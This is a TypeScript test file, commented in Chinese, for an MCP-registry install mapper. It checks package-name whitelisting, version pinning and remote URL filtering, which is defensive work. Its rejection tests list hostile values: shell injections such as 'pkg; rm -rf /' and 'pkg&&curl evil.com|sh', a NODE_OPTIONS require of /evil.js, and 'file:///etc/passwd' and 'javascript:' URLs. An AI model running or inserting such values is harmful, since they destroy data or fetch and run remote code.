import { describe, expect, it } from "vitest";
import {
  buildOption,
  buildRemoteOptions,
  isInstallable,
  pinnedSpec,
  registryServerId,
  runnerFor,
  toEntry,
  toServerConfig,
  validatePackage,
} from "./map.js";
import { titleOf, type RegistryItem, type RegistryPackage } from "./types.js";
import { slugPart } from "../mcp/bridge.js";

const pkg = (over: Partial<RegistryPackage> = {}): RegistryPackage => ({
  registryType: "npm",
  identifier: "@scope/pkg-name",
  version: "1.2.3",
  ...over,
});

/* ================================================================== 包名白名单（安全） */

describe("validatePackage · 白名单", () => {
  it("放行正常的包名形态", () => {
    for (const id of [
      "@modelcontextprotocol/server-filesystem",
      "mcp-server-fetch",
      "a",
      "@a/b",
      "a.b_c-d",
      "@scope/pkg.name",
    ]) {
      expect(validatePackage(pkg({ identifier: id })), `应放行 ${id}`).toBeNull();
    }
  });

  it("★ 拒绝含 shell 元字符的包名（命令注入）", () => {
    // 这些是最典型的注入串：npx 会被拼进 shell 命令。
    const evil = [
      "pkg; rm -rf /",
      "pkg name", // 空格 → 拆成两个参数
      "pkg&&whoami",
      "pkg|cat",
      "pkg>out.txt",
      "pkg<in.txt",
      "pkg`id`",
      "$(id)",
      "pkg&&curl evil.com|sh",
      'pkg"x"',
      "pkg'x'",
      "pkg\\x",
      "pkg{a}",
      "pkg[a]",
      "pkg(a)",
      "pkg%0Aid",
      "pkg\nid",
    ];
    for (const id of evil) {
      const r = validatePackage(pkg({ identifier: id }));
      expect(r, `应拒绝 ${JSON.stringify(id)}`).not.toBeNull();
      expect(r?.field).toBe("identifier");
    }
  });

  it("拒绝空包名", () => {
    expect(validatePackage(pkg({ identifier: "" }))?.reason).toContain("空");
  });

  it("拒绝超长包名并截断展示值", () => {
    const r = validatePackage(pkg({ identifier: "a".repeat(300) }));
    expect(r?.reason).toContain("过长");
    expect(r!.value.length).toBeLessThanOrEqual(41); // 40 + 省略号
  });

  it("校验版本号字符集", () => {
    expect(validatePackage(pkg({ version: "1.0.0-beta.1" }))).toBeNull();
    expect(validatePackage(pkg({ version: "1.0.0+build.1" }))).toBeNull();
    expect(validatePackage(pkg({ version: "1.0.0; id" }))?.field).toBe("version");
    expect(validatePackage(pkg({ version: "latest && id" }))?.field).toBe("version");
  });

  it("版本号缺省时放行", () => {
    expect(validatePackage(pkg({ version: undefined }))).toBeNull();
  });

  it("拒绝原因要能看出是哪个字段、哪个值", () => {
    const r = validatePackage(pkg({ identifier: "bad;id" }));
    expect(r?.field).toBe("identifier");
    expect(r?.value).toBe("bad;id");
    expect(r?.reason).toContain("不允许的字符");
  });
});

/* ================================================================== 装法构造 */

describe("runnerFor · 逻辑命令名（本机真实形态由桌面端翻译）", () => {
  it("npm → npx，pypi → uvx", () => {
    expect(runnerFor("npm")).toBe("npx");
    expect(runnerFor("pypi")).toBe("uvx");
  });

  it("不支持的类型返回空串", () => {
    for (const t of ["oci", "nuget", "mcpb", "unknown", ""]) {
      expect(runnerFor(t)).toBe("");
    }
  });
});

describe("pinnedSpec · 把包钉到具体版本", () => {
  it("npm 用 @，pypi 用 ==（PEP 508，uvx 认这个写法）", () => {
    expect(pinnedSpec("npm", "@scope/pkg", "1.2.3")).toBe("@scope/pkg@1.2.3");
    expect(pinnedSpec("pypi", "mcp-server-fetch", "0.6.2")).toBe("mcp-server-fetch==0.6.2");
  });

  it("没有版本时不编造", () => {
    expect(pinnedSpec("npm", "pkg", undefined)).toBe("pkg");
  });
});

describe("buildOption · 本地包（stdio）", () => {
  it("npm → npx -y 钉死版本", () => {
    const o = buildOption(pkg());
    expect(o.kind).toBe("stdio");
    expect(o.command).toBe("npx");
    expect(o.args).toEqual(["-y", "@scope/pkg-name@1.2.3"]);
    expect(o.registryType).toBe("npm");
    expect(o.version).toBe("1.2.3");
    expect(isInstallable(o)).toBe(true);
  });

  it("pypi → uvx，不带 -y（npx 才有的交互跳过参数）", () => {
    const o = buildOption(pkg({ registryType: "pypi", identifier: "mcp-server-fetch", version: "0.6.2" }));
    expect(o.command).toBe("uvx");
    expect(o.args).toEqual(["mcp-server-fetch==0.6.2"]);
  });

  it("★ Windows 上真实执行形态由桌面端翻译：这里只存逻辑命令", () => {
    // 不能写成 npx.cmd / npx.exe：Node ≥18.20.2 对 .cmd 直接 EINVAL（CVE-2024-27980），
    // 而渲染层也不知道用户机器长什么样。
    expect(buildOption(pkg()).command).toBe("npx");
  });

  it("★ 没有固定版本的包不生成命令", () => {
    // 浮动版本 = 用户确认的这一次和实际跑的那一次可能不是同一份代码。
    const o = buildOption(pkg({ version: undefined }));
    expect(o.command).toBeUndefined();
    expect(o.args).toBeUndefined();
    expect(o.unsupported).toContain("固定版本");
    expect(isInstallable(o)).toBe(false);
  });

  it("oci / nuget / mcpb / 未知类型标不支持", () => {
    for (const t of ["oci", "nuget", "mcpb", ""]) {
      const o = buildOption(pkg({ registryType: t }));
      expect(o.unsupported).toBeTruthy();
      expect(o.command).toBeUndefined();
      expect(isInstallable(o)).toBe(false);
    }
  });

  it("★ 包类型字段缺失时按未知处理，绝不猜一个命令去执行", () => {
    const o = buildOption({ identifier: "pkg", version: "1.0.0" } as RegistryPackage);
    expect(o.unsupported).toContain("无法识别");
    expect(o.command).toBeUndefined();
  });

  it("★ 白名单在生成命令之前拦截：恶意包名拿不到可执行文件", () => {
    const o = buildOption(pkg({ identifier: "pkg; rm -rf /" }));
    expect(o.command).toBeUndefined();
    expect(o.args).toBeUndefined();
    expect(o.unsupported).toContain("包名含不允许的字符");
    expect(o.unsupported).toContain("pkg; rm -rf /");
  });

  it("★ packageArguments 与 environmentVariables 绝不出现在产物里", () => {
    const o = buildOption(
      pkg({
        packageArguments: [{ type: "named", name: "token", value: "x" }] as unknown,
        environmentVariables: { NODE_OPTIONS: "--require /evil.js" },
      }),
    );
    const serialized = JSON.stringify(o);
    expect(serialized).not.toContain("NODE_OPTIONS");
    expect(serialized).not.toContain("evil.js");
    expect(serialized).not.toContain("packageArguments");
  });
});

/* ================================================================== 远程 */

describe("buildRemoteOptions", () => {
  it("识别 streamable-http 与 sse", () => {
    const opts = buildRemoteOptions({
      name: "x/y",
      remotes: [
        { type: "streamable-http", url: "https://a.example/mcp" },
        { type: "sse", url: "https://b.example/sse" },
      ],
    });
    expect(opts).toHaveLength(2);
    expect(opts[0]).toMatchObject({ kind: "http", url: "https://a.example/mcp" });
  });

  it("★ 不按 type 过滤（产品经理实测：按声明过滤会错杀可连服务）", () => {
    // 实测：有服务声明 sse 但实际是 streamable-http（GET 得 405，POST 正常）。
    // 我们的 httpClient 两种都试，所以未知/不准确的 type 一律放行，交给连接时实测。
    const opts = buildRemoteOptions({
      name: "x/y",
      remotes: [
        { type: "websocket", url: "https://a.example" },      // 完全陌生的 type
        { type: undefined, url: "https://b.example" },        // 没声明 type
        { type: "sse", url: "https://c.example" },            // 声明不准的 sse
      ],
    });
    expect(opts).toHaveLength(3);
  });

  it("拒绝非 http(s) 的 URL（唯一的过滤条件）", () => {
    const opts = buildRemoteOptions({
      name: "x/y",
      remotes: [
        { type: "streamable-http", url: "file:///etc/passwd" },
        { type: "streamable-http", url: "javascript:alert(1)" },
        { type: "streamable-http", url: "https://ok.example/mcp" },
      ],
    });
    expect(opts).toHaveLength(1);
    expect(opts[0].url).toBe("https://ok.example/mcp");
  });

  it("忽略缺 url 的项", () => {
    const opts = buildRemoteOptions({
      name: "x/y",
      remotes: [
        { type: "streamable-http", url: "" },
        { type: "streamable-http", url: "https://ok.example/mcp" },
      ],
    });
    expect(opts).toHaveLength(1);
  });

  it("★ 透出 headers 声明（实测 13% 的 remote 需要鉴权）", () => {
    const opts = buildRemoteOptions({
      name: "x/y",
      remotes: [
        {
          type: "streamable-http",
          url: "https://a.example/mcp",
          headers: [
            { name: "Authorization", description: "Bearer <your API key>", isSecret: true, isRequired: true },
          ],
        },
      ],
    });
    expect(opts[0].headerHints).toHaveLength(1);
    expect(opts[0].headerHints![0]).toMatchObject({ name: "Authorization", isSecret: true });
    // ★ 只透「要哪个头」，绝不透值 —— Registry 不提供值，也不该有值出现在我们代码里
    expect(JSON.stringify(opts[0])).not.toMatch(/"value"/);
  });

  it("没有 headers 时 headerHints 为 undefined（不留空数组）", () => {
    const opts = buildRemoteOptions({ name: "x/y", remotes: [{ type: "streamable-http", url: "https://a.example" }] });
    expect(opts[0].headerHints).toBeUndefined();
  });

  it("★ 检测 URL 模板变量（实测 3/883，极少但要能提示）", () => {
    const opts = buildRemoteOptions({
      name: "x/y",
      remotes: [{ type: "streamable-http", url: "https://mcp.biel.ai/v2/{project_slug}/mcp" }],
    });
    expect(opts[0].urlHasVariables).toBe(true);
  });

  it("无变量的 URL → urlHasVariables 为 false", () => {
    const opts = buildRemoteOptions({ name: "x/y", remotes: [{ type: "streamable-http", url: "https://a.example/mcp" }] });
    expect(opts[0].urlHasVariables).toBe(false);
  });
});

/* ================================================================== id 与配置映射 */

describe("registryServerId", () => {
  it("有 mcp-registry- 前缀，与预置的 mcp- 区分开", () => {
    expect(registryServerId("io.github.foo/mcp-bar")).toMatch(/^mcp-registry-/);
    expect(registryServerId("x/y")).not.toBe("mcp-x"); // 别和 presetServerId 撞
  });

  it("复用 bridge.ts 的 slugPart（同一命名规则）", () => {
    expect(registryServerId("io.github.foo/mcp-bar")).toBe(`mcp-registry-${slugPart("io.github.foo/mcp-bar")}`);
  });

  it("不同 key 产出不同 id（不撞）", () => {
    expect(registryServerId("a/b")).not.toBe(registryServerId("a/b2"));
  });
});

describe("toServerConfig", () => {
  const entry = {
    key: "io.github.foo/mcp-bar",
    title: "foo",
    description: "",
    status: "active",
    options: [],
  };

  it("产出 origin=registry 与 registryName", () => {
    const cfg = toServerConfig(entry, { kind: "stdio", label: "x", command: "npx", args: ["-y", "p"] });
    expect(cfg.origin).toBe("registry");
    expect(cfg.registryName).toBe("io.github.foo/mcp-bar");
    expect(cfg.enabled).toBe(true);
  });

  it("时间戳走注入的 now（便于测试）", () => {
    const cfg = toServerConfig(entry, { kind: "http", label: "x", url: "https://a" }, () => "2026-01-01T00:00:00.000Z");
    expect(cfg.createdAt).toBe("2026-01-01T00:00:00.000Z");
    expect(cfg.updatedAt).toBe("2026-01-01T00:00:00.000Z");
  });

  it("args 是副本，改外部不影响结果", () => {
    const args = ["-y", "p"];
    const cfg = toServerConfig(entry, { kind: "stdio", label: "x", command: "npx", args });
    args.push("evil");
    expect(cfg.args).toEqual(["-y", "p"]);
  });

  it("http 装法不产出 command/args", () => {
    const cfg = toServerConfig(entry, { kind: "http", label: "x", url: "https://a.example/mcp" });
    expect(cfg.transport).toBe("http");
    expect(cfg.command).toBeUndefined();
    expect(cfg.args).toBeUndefined();
  });

  it("★ 用户填的 headers 写入配置（httpClient:58 已支持带 headers）", () => {
    const cfg = toServerConfig(
      entry,
      { kind: "http", label: "x", url: "https://a.example/mcp" },
      undefined,
      { Authorization: "Bearer secret123" },
    );
    expect(cfg.headers).toEqual({ Authorization: "Bearer secret123" });
  });

  it("headers 是副本，改外部不影响结果", () => {
    const headers = { Authorization: "Bearer x" };
    const cfg = toServerConfig(entry, { kind: "http", label: "x", url: "https://a" }, undefined, headers);
    headers.Authorization = "Bearer tampered";
    expect(cfg.headers!.Authorization).toBe("Bearer x");
  });

  it("没填 headers 时为 undefined（不留空对象）", () => {
    const cfg = toServerConfig(entry, { kind: "http", label: "x", url: "https://a" }, undefined, {});
    expect(cfg.headers).toBeUndefined();
  });

  it("★ 本地包写入台账字段（registryType / registryVersion）", () => {
    const cfg = toServerConfig(
      entry,
      { kind: "stdio", label: "npm · p@1.2.3", command: "npx", args: ["-y", "p@1.2.3"], registryType: "npm", version: "1.2.3" },
    );
    expect(cfg.registryType).toBe("npm");
    expect(cfg.registryVersion).toBe("1.2.3");
  });

  it("远程装法没有本机包，两个台账字段都为空", () => {
    const cfg = toServerConfig(entry, { kind: "http", label: "x", url: "https://a", registryType: undefined });
    expect(cfg.registryType).toBeUndefined();
    expect(cfg.registryVersion).toBeUndefined();
  });
});

/* ================================================================== toEntry */

describe("toEntry", () => {
  const item: RegistryItem = {
    server: {
      name: "io.github.foo/mcp-bar",
      description: "d",
      version: "1.0.0",
      repository: { url: "https://github.com/foo/bar", source: "github" },
      packages: [pkg({ identifier: "mcp-bar" })],
      remotes: [{ type: "streamable-http", url: "https://a.example/mcp" }],
    },
    _meta: { "io.modelcontextprotocol.registry/official": { status: "active", isLatest: true } },
  };

  it("★ 远程装法排在最前", () => {
    const e = toEntry(item);
    expect(e.options[0].kind).toBe("http");
  });

  it("★ status 非 active 仍返回条目（由上层决定是否展示）", () => {
    const e = toEntry({ ...item, _meta: { "io.modelcontextprotocol.registry/official": { status: "deprecated" } } });
    expect(e.status).toBe("deprecated"); // 透出给上层做过滤与风险评级
  });

  it("展示名回落：title 为 null 时用 name 尾段", () => {
    expect(toEntry({ server: { name: "io.github.foo/mcp-bar" } }).title).toBe("mcp-bar");
    expect(titleOf({ name: "a/b/c" })).toBe("c");
    expect(titleOf({ name: "a/b/c", title: "T" })).toBe("T");
  });

  it("仓库信息透传（仅展示用）", () => {
    const e = toEntry(item);
    expect(e.repoUrl).toBe("https://github.com/foo/bar");
    expect(e.repoSource).toBe("github");
  });

  it("跳过没有 identifier 的包（不崩）", () => {
    const e = toEntry({ server: { name: "a/b", packages: [{ registryType: "npm", identifier: "" } as RegistryPackage] } });
    expect(e.options).toHaveLength(0);
  });

  it("server 缺 fields 也不崩", () => {
    const e = toEntry({ server: { name: "a/b" } });
    expect(e.options).toEqual([]);
    expect(e.status).toBe("unknown");
    expect(e.description).toBe("");
  });
});
